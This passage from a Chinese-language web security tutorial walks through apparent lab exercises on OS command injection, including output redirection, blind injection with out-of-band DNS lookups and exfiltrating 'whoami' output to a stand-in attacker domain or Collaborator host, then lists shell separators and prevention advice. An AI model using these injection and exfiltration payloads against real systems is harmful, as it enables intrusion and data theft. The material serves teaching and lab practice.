应用程序从此位置提供产品目录的图像。您可以将插入命令的输出重定向到此文件夹中的文件，然后使用图像加载URL检索文件的内容。 在feedback提交信息，报错，存在命令注入![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRFp0PtXfVibZPDOtnNLeDunXkic2bibCdgxveQTkoXfG40ahNwWInXkzXZzwXKeXTnfgetMHtseHNg/640?wx_fmt=png&from=appmsg "")  
在email参数的后面加上||whoami>/var/www/images/output.txt||  
，将这个命令回显的值写入文件中去![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRFp0PtXfVibZPDOtnNLeDuJxnrSSicBwvrQrd5J9meyjRn8mtymjlYqlhTff6oBSFotKZc68yvCTQ/640?wx_fmt=png&from=appmsg "")  
我们不能直接访问images，所以需要点开一个图片链接传参![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRFp0PtXfVibZPDOtnNLeDuxaDzd3W3IMSyY0Tm5ccpDKBDPgBDZdEC9JrsLv7PCz2BkA3GeenA2A/640?wx_fmt=png&from=appmsg "")  
  
### 1.4.3通过带外（OAST）技术 利用OS命令盲注  
  
你可以使用 OAST 技术来注入命令，该命令将触发带外网络交互 到你控制的系统上。例如：  
```
& nslookup kgji2ohoyw.web-attacker.com &

```  
  
该负载使用nslookup  
命令对指定的域进行 DNS 查找。攻击者可以监控 指定的查找是否发生，从而检测命令是否已成功注入。  
#### 实验4：带外交互的盲操作系统命令注入  
  
利用collaborator客户端，复制url![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRFp0PtXfVibZPDOtnNLeDuc6lh7lw9cicCwMCcYxhKb6VCfS8sibtcaZoicHticFFGyKxvOx7v5ibgxkw/640?wx_fmt=png&from=appmsg "")  
  
```
||nslookup j7r9svex407ysn02ren41lxz0q6hu7iw.oastify.com||

```  
  
修改，提交成功![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRFp0PtXfVibZPDOtnNLeDuLgDXyBMxO75OyRv3TlKa84KibNzFPiboGGLLLNRO13lLw4bQhYo9C8ow/640?wx_fmt=png&from=appmsg "")  
查看collaborator![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRFp0PtXfVibZPDOtnNLeDuzhZySPUnm7W4y4S9nWlVrUFqVImRDIq7tiaakWOhb2eicCZNJNdA7Cdw/640?wx_fmt=png&from=appmsg "")  
  
#### 实验5：带外数据泄露的OS命令盲注  
  
带外通道还提供了一种简单的方法，可以从注入的命令中提取输出：  
```
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &

```  
  
这将导致 DNS 去查找攻击者的域，其中包含whoami  
命令的结果：  
```
www.user.kgji2ohoyw.web-attacker.com

```  
  
**实验目标：**  
- 在 反馈功能 中，尝试利用 OS命令盲注漏洞，并触发与外部域的带外交互。  
  
- 通过触发带外交互，将whoami  
命令执行的输出外泄到 Burp Collaborator 。  
  
- 在网站中输入当前用户的名称，以完成实验。  
  
同理，payload，通过双反引号``  
内联执行whoami  
命令，并将其输出 拼接到外部域当中。  
```
||nslookup `whoami`.j7r9svex407ysn02ren41lxz0q6hu7iw.oastify.com||

```  
  
image.png  
查看DNS 查询记录，说明注入的命令成功执行，并造成了带外交互。![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRFp0PtXfVibZPDOtnNLeDufvmXVz7llKdwkENP4TzicbRFIwibia0I1V0TKoo9SUa0Jzku3ibgtNcTTA/640?wx_fmt=png&from=appmsg "")  
  
  
点击submit solution，在对话框输入刚刚得到的用户名即可![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRFp0PtXfVibZPDOtnNLeDuS9micbs2M9AymkM69YYn4Im2a33rqnqpjwefE5dQAYMdNJh5jMPGouw/640?wx_fmt=png&from=appmsg "")  
  
## 1.5注入OS命令的方法  
  
可以使用各种 shell 元字符来执行 OS 命令注入攻击。  
  
许多字符用作命令分隔符，允许将命令链接在一起。以下命令分隔符适用于 Windows 和 Unix 的系统：  
- &  
  
- &&  
  
- |  
  
- ||  
  
以下命令分隔符仅适用于 Unix 的系统：  
- ;  
  
- 换行（0x0a  
 或 \n  
）  
  
在基于 Unix 的系统上，你还可以使用 反引号或美元字符 在原始命令中执行注入命令的内联执行：  
- `  
 注入命令 `  
  
- $(  
 注入命令 )  
  
请注意，不同的 shell 元字符具有不同的细微行为，这些行为可能会影响它们 在某些情况下是否生效，以及它们是否允许 检索带内命令回显 或 仅对盲目利用有效。  
  
有时，你控制的输入会显示在原始命令的引号内。在这种情况下，在使用合适的 shell 元字符注入新命令之前，你需要终止带引号的上下文（使用 "  
 或 '  
）。  
## 1.6如何防范OS命令注入攻击  
  
到目前为止，防范 OS命令注入漏洞的最有效方法是，永远不要从应用层代码中 调用操作系统命令。在几乎所有情况下，都要使用更安全的平台 API 来实现所需功能的替代方法。  
  
如果认为不可避免地，必须要使用用户提供的输入 来调用操作系统命令，则必须执行强输入验证。有效验证的一些示例包括：  
- 根据允许值的白名单进行验证。  
  
- 验证输入是否为数字。  
  
- 验证输入是否仅包含 字母/数字 字符，不包含其他语法或空格。  
  
不要试图通过转义 shell 元字符来清理输入。在实践过程中，这太容易出错，并且很容易被熟练的攻击者绕过。  
  
  
